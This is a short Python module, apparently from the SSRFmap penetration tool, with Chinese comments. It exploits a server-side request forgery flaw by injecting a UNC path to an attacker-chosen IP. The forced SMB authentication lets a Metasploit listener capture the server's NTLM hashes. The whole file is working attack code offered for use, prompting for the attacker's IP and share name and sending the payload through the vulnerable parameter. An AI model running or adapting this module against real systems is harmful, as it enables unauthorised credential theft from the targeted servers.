import logging

from core.utils import *

# 注意
# 使用 Metasploit 的 auxiliary/server/capture/smb 模块搭建监听器

name = "smbhash"
description = "通过嵌入 UNC 路径（\\\\SERVER\\SHARE）强制触发一次 SMB 认证"
author = "Swissky"
documentation = []


class exploit:
    UNC_EXAMPLE = "\\\\192.168.1.2\\SSRFmap"
    UNC_IP = "192.168.1.2"
    UNC_FILE = "SSRFmap"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")

        UNC_IP = input("UNC IP（默认 192.168.1.2）: ")
        if UNC_IP != "":
            self.UNC_IP = UNC_IP

        UNC_FILE = input("UNC 文件名（默认 SSRFmap）: ")
        if UNC_FILE != "":
            self.UNC_FILE = UNC_FILE

        payload = wrapper_unc(self.UNC_FILE, self.UNC_IP)
        r = requester.do_request(args.param, payload)
        logging.info(f"\033[32m发送 UNC 路径\033[0m : {payload}")
